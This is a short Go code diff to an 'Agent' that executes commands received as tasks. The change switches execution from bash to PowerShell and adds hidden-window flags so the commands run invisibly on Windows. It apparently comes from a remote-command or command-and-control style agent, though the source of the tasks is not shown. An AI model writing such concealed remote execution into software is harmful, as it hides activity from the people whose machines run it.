@@ -10,6 +10,7 @@ import (
     "time"
 	"encoding/json"
 	"bytes"
+	"syscall"
 )
 
 type Agent struct {
@@ -96,7 +97,8 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 	switch task.Action {
 	case "command":
 		var cmd *exec.Cmd
-		cmd = exec.Command("bash", "-c", task.Command)
+		cmd = exec.Command("powershell", "-WindowStyle", "Hidden","-Command", task.Command)
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,}
 		out, err := cmd.CombinedOutput()
 		if err != nil {
 			result.Result = string(out)
